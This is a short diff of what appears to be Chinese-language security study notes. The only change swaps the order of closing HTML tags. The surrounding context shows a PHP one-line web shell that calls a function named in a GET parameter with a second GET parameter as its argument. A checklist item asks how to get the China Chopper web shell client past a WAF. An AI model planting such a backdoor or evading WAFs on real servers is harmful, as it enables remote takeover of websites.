@@ -82,7 +82,7 @@
       $s_func = $_GET[‘s_func’];
       $info = $_GET[‘info’];
       $s_func($info);
-      ?></p></code>
+      ?></code></p>
 
  - [ ] 菜刀被waf拦截后要怎么处理?
  
